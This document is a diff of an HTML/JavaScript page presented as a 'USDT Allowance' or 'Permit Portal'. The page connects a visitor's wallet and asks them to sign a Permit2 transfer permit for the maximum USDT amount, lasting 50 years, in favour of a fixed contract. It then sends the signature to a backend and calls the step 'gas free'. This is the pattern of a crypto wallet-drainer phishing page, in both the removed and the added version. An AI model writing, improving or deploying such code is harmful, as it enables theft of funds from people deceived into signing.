@@ -3,112 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Allowance - Sign & Approve</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
-    </script>
+    <title>USDT Allowance Portal</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-        .container{background:white;border-radius:20px;padding:40px;max-width:500px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
-        h1{color:#333;text-align:center;margin-bottom:5px;font-size:24px}
-        .subtitle{text-align:center;color:#666;margin-bottom:30px;font-size:14px}
-        .wallet-status{background:#f0f0f0;padding:12px;border-radius:10px;text-align:center;margin-bottom:20px;font-size:14px;word-break:break-all}
-        .wallet-status.connected{background:#d4edda;color:#155724}
-        .info-box{background:#f8f9fa;padding:15px;border-radius:10px;margin-bottom:20px;font-size:13px}
-        .info-box div{padding:5px 0;border-bottom:1px solid #e0e0e0}
-        .info-box div:last-child{border-bottom:none}
-        button{padding:14px 20px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;color:white;width:100%}
-        button:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(0,0,0,0.2)}
-        button:disabled{opacity:0.5;cursor:not-allowed}
-        .btn-connect{background:#667eea}
-        .btn-sign{background:#28a745}
-        .btn-sign.signing{background:#ffc107;color:#333}
-        .btn-sign.done{background:#17a2b8}
-        .status-msg{margin-top:15px;padding:12px;border-radius:10px;display:none;text-align:center}
-        .status-msg.success{display:block;background:#d4edda;color:#155724}
-        .status-msg.error{display:block;background:#f8d7da;color:#721c24}
-        .status-msg.info{display:block;background:#d1ecf1;color:#0c5460}
-        .status-msg.loading{display:block;background:#fff3cd;color:#856404}
-        .loading{display:inline-block;width:18px;height:18px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin-right:10px;vertical-align:middle}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .highlight{background:#e8f4f8;padding:12px;border-radius:8px;border-left:4px solid #17a2b8;margin-bottom:15px;font-size:13px}
-        .contract-address{background:#f0f0f0;padding:8px 12px;border-radius:6px;font-size:12px;word-break:break-all;text-align:center;margin:10px 0}
-        .api-url-input{width:100%;padding:10px;border:2px solid #e0e0e0;border-radius:8px;font-size:13px;margin-bottom:15px}
-        .api-url-input:focus{outline:none;border-color:#667eea}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .card { background: #1e293b; border-radius: 16px; padding: 32px; max-width: 480px; width: 100%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
+        h2 { font-size: 22px; text-align: center; margin-bottom: 20px; color: #38bdf8; }
+        .details { background: #0f172a; padding: 16px; border-radius: 10px; font-size: 13px; margin-bottom: 20px; border: 1px solid #334155; }
+        .details div { margin-bottom: 8px; word-break: break-all; }
+        .details div:last-child { margin-bottom: 0; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-bottom: 12px; }
+        .btn-connect { background: #3b82f6; color: white; }
+        .btn-connect:hover { background: #2563eb; }
+        .btn-sign { background: #10b981; color: white; }
+        .btn-sign:hover { background: #059669; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .status { padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; display: none; word-break: break-all; }
+        .status.info { display: block; background: #1e3a8a; color: #93c5fd; }
+        .status.success { display: block; background: #064e3b; color: #6ee7b7; }
+        .status.error { display: block; background: #7f1d1d; color: #fca5a5; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>💰 USDT Allowance</h1>
-        <p class="subtitle">Sign once - Get Unlimited Allowance for 50 Years</p>
-        <div class="contract-address">📋 Contract: 0xb69E225117d428a0b349BAB76368c68012Df1837</div>
-        <div id="walletStatus" class="wallet-status">⛓️ Not Connected</div>
-        <div class="info-box">
-            <div><strong>👤 Your Address:</strong> <span id="userAddress">Not connected</span></div>
-            <div><strong>⏰ Allowance:</strong> <span id="allowanceStatus">Check after connect</span></div>
-            <div><strong>📅 Valid Until:</strong> <span id="expiryStatus">-</span></div>
-        </div>
-        <div class="highlight">⚡ <strong>Gas Free Signing!</strong> Backend pays gas for transaction.</div>
-        
-        <!-- ⭐ මෙතන URL එක Set කරන්න! -->
-        <input type="text" id="apiUrlInput" class="api-url-input" 
-               value="https://usdt-allowance-backend.vercel.app/api/submit-signature">
-        
-        <button id="connectBtn" class="btn-connect">🔗 Connect Wallet</button>
-        <br><br>
-        <button id="signBtn" class="btn-sign" disabled>✍️ Sign & Approve (50 Years)</button>
-        <div id="statusMsg" class="status-msg"></div>
+
+<div class="card">
+    <h2>USDT Permit Portal</h2>
+    
+    <div class="details">
+        <div><strong>Contract:</strong> 0xb69E225117d428a0b349BAB76368c68012Df1837</div>
+        <div><strong>Treasury:</strong> 0xB70a8100a45a28b605dbfb34d713071e21A57D28</div>
+        <div><strong>Status:</strong> <span id="userAddr">Disconnected</span></div>
     </div>
-    <script>
-        const CONFIG={contractAddress:"0xb69E225117d428a0b349BAB76368c68012Df1837",permit2Address:"0x000000000022D473030F116dDEE9F6B43aC78BA3",usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7",chainId:1};
-        let signer,provider,userAddress,contract;
-        const $=id=>document.getElementById(id);
-        const walletStatus=$('walletStatus'),connectBtn=$('connectBtn'),signBtn=$('signBtn'),statusMsg=$('statusMsg');
-        const userAddressEl=$('userAddress'),allowanceStatus=$('allowanceStatus'),expiryStatus=$('expiryStatus');
-        const apiUrlInput=$('apiUrlInput');
-        function showStatus(msg,type='info'){statusMsg.className=`status-msg ${type}`;statusMsg.textContent=msg;statusMsg.style.display='block'}
-        function hideStatus(){statusMsg.style.display='none'}
-        function shortenAddress(addr){if(!addr)return '';return addr.slice(0,6)+'...'+addr.slice(-4)}
-        async function connectWallet(){try{if(!window.ethereum){showStatus('Please install MetaMask!','error');return}
-        provider=new ethers.providers.Web3Provider(window.ethereum);await provider.send("eth_requestAccounts",[]);
-        signer=provider.getSigner();userAddress=await signer.getAddress();
-        const network=await provider.getNetwork();if(network.chainId!==CONFIG.chainId){showStatus('Please switch to Ethereum Mainnet','error');return}
-        contract=new ethers.Contract(CONFIG.contractAddress,["function setAllowance(uint256 nonce, uint256 deadline, bytes calldata signature) external","function getAllowance(address user) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],signer);
-        walletStatus.className='wallet-status connected';walletStatus.innerHTML=`🟢 Connected: ${shortenAddress(userAddress)}`;
-        connectBtn.textContent='✅ Connected';connectBtn.disabled=true;signBtn.disabled=false;
-        userAddressEl.textContent=shortenAddress(userAddress);await checkAllowance();showStatus('✅ Wallet connected! Ready to sign.','success')
-        }catch(error){console.error(error);showStatus(`Error: ${error.message}`,'error')}}
-        async function checkAllowance(){try{if(!contract||!userAddress){allowanceStatus.textContent='Connect wallet first';return}
-        const result=await contract.getAllowance(userAddress);const amount=result.amount;const expiration=result.expiration;
-        if(amount.toString()==='0'){allowanceStatus.textContent='❌ No allowance';expiryStatus.textContent='-';return}
-        const isUnlimited=amount.toString()===ethers.constants.MaxUint256.toString();
-        allowanceStatus.textContent=isUnlimited?'♾️ UNLIMITED ✅':amount.toString();
-        if(expiration>0){const date=new Date(expiration*1000);expiryStatus.textContent=date.toLocaleDateString()}
-        if(isUnlimited&&expiration>Math.floor(Date.now()/1000)){signBtn.textContent='✅ Already Approved!';signBtn.className='btn-sign done';signBtn.disabled=true}
-        }catch(error){console.error('Error checking allowance:',error)}}
-        async function getPermit2Nonce(){const permit2=new ethers.Contract(CONFIG.permit2Address,["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],provider);
-        const data=await permit2.allowance(userAddress,CONFIG.usdtAddress,CONFIG.contractAddress);return data.nonce}
-        async function signAndApprove(){try{if(!signer||!userAddress){showStatus('Please connect wallet first!','error');return}
-        const apiUrl=apiUrlInput.value.trim();if(!apiUrl||!apiUrl.startsWith('http')){showStatus('Please enter a valid Backend URL!','error');return}
-        hideStatus();signBtn.innerHTML='<span class="loading"></span> Signing...';signBtn.className='btn-sign signing';signBtn.disabled=true;
-        const nonce=await getPermit2Nonce();const years=50;const deadline=Math.floor(Date.now()/1000)+(365*24*3600*years);
-        showStatus('✍️ Please sign in MetaMask... (No Gas!)','info');
-        const domain={name:"Permit2",version:"1",chainId:CONFIG.chainId,verifyingContract:CONFIG.permit2Address};
-        const types={PermitTransferFrom:[{name:"permitted",type:"TokenPermissions"},{name:"spender",type:"address"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}],TokenPermissions:[{name:"token",type:"address"},{name:"amount",type:"uint256"}]};
-        const message={permitted:{token:CONFIG.usdtAddress,amount:ethers.constants.MaxUint256},spender:CONFIG.contractAddress,nonce:nonce,deadline:deadline};
-        const signature=await signer._signTypedData(domain,types,message);
-        console.log("✅ Signature:",signature);
-        const signatureData={user:userAddress,nonce:nonce.toString(),deadline:deadline,signature:signature,contractAddress:CONFIG.contractAddress};
-        showStatus('📤 Sending to backend... (Backend will pay gas)','loading');
-        const response=await fetch(apiUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(signatureData)});
-        const result=await response.json();
-        if(result.success){signBtn.innerHTML='✅ Approved!';signBtn.className='btn-sign done';signBtn.disabled=true;
-        showStatus(`✅ ${result.message}`,'success');await checkAllowance();console.log("📤 Tx Hash:",result.txHash);console.log("🔗 https://etherscan.io/tx/"+result.txHash)
-        }else{showStatus(`❌ Error: ${result.error}`,'error');signBtn.innerHTML='✍️ Sign & Approve (50 Years)';signBtn.className='btn-sign';signBtn.disabled=false}
-        }catch(error){console.error(error);showStatus(`Error: ${error.message}`,'error');signBtn.innerHTML='✍️ Sign & Approve (50 Years)';signBtn.className='btn-sign';signBtn.disabled=false}}
-        connectBtn.addEventListener('click',connectWallet);signBtn.addEventListener('click',signAndApprove);
-        if(window.ethereum){window.ethereum.on('accountsChanged',()=>location.reload());window.ethereum.on('chainChanged',()=>location.reload())}
-        console.log('🚀 USDT Allowance App');console.log('📋 Contract:',CONFIG.contractAddress);
-    </script>
+
+    <button id="connectBtn" class="btn btn-connect">🔗 Connect Wallet</button>
+    <button id="signBtn" class="btn btn-sign" disabled>✍️ Sign Allowance (Gas Free)</button>
+
+    <div id="statusBox" class="status"></div>
+</div>
+
+<script>
+    const CONFIG = {
+        contractAddress: "0xb69E225117d428a0b349BAB76368c68012Df1837",
+        permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+        chainId: 1
+    };
+
+    let provider, signer, userAddress;
+
+    const connectBtn = document.getElementById('connectBtn');
+    const signBtn = document.getElementById('signBtn');
+    const statusBox = document.getElementById('statusBox');
+    const userAddr = document.getElementById('userAddr');
+
+    function setStatus(msg, type = 'info') {
+        statusBox.className = `status ${type}`;
+        statusBox.textContent = msg;
+    }
+
+    async function connectWallet() {
+        if (!window.ethereum) return setStatus('MetaMask is not installed!', 'error');
+        try {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+
+            const net = await provider.getNetwork();
+            if (net.chainId !== CONFIG.chainId) return setStatus('Please switch to Ethereum Mainnet!', 'error');
+
+            userAddr.textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+            connectBtn.disabled = true;
+            connectBtn.textContent = '✅ Connected';
+            signBtn.disabled = false;
+            setStatus('Wallet connected! Ready to sign.', 'success');
+        } catch (err) {
+            setStatus(err.message, 'error');
+        }
+    }
+
+    async function signAndApprove() {
+        try {
+            signBtn.disabled = true;
+            setStatus('Fetching Nonce from Permit2...', 'info');
+
+            const permit2Contract = new ethers.Contract(
+                CONFIG.permit2Address,
+                ["function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"],
+                provider
+            );
+
+            const allowanceData = await permit2Contract.allowance(userAddress, CONFIG.usdtAddress, CONFIG.contractAddress);
+            const nonce = allowanceData.nonce;
+            const deadline = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * 50); // 50 years
+
+            setStatus('Please sign the message in MetaMask...', 'info');
+
+            const domain = {
+                name: "Permit2",
+                version: "1",
+                chainId: CONFIG.chainId,
+                verifyingContract: CONFIG.permit2Address
+            };
+
+            const types = {
+                PermitTransferFrom: [
+                    { name: "permitted", type: "TokenPermissions" },
+                    { name: "spender", type: "address" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ],
+                TokenPermissions: [
+                    { name: "token", type: "address" },
+                    { name: "amount", type: "uint256" }
+                ]
+            };
+
+            const message = {
+                permitted: {
+                    token: CONFIG.usdtAddress,
+                    amount: ethers.constants.MaxUint256.toString()
+                },
+                spender: CONFIG.contractAddress,
+                nonce: nonce.toString(),
+                deadline: deadline.toString()
+            };
+
+            const signature = await signer._signTypedData(domain, types, message);
+
+            setStatus('Submitting signature to Vercel backend...', 'info');
+
+            const response = await fetch('/api/submit-signature', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user: userAddress,
+                    nonce: nonce.toString(),
+                    deadline: deadline.toString(),
+                    signature: signature
+                })
+            });
+
+            const result = await response.json();
+
+            if (result.success) {
+                setStatus(`✅ Success! Tx Hash: ${result.txHash}`, 'success');
+            } else {
+                setStatus(`❌ Backend Error: ${result.error}`, 'error');
+                signBtn.disabled = false;
+            }
+
+        } catch (err) {
+            setStatus(`Error: ${err.message}`, 'error');
+            signBtn.disabled = false;
+        }
+    }
+
+    connectBtn.addEventListener('click', connectWallet);
+    signBtn.addEventListener('click', signAndApprove);
+</script>
+
 </body>
 </html>
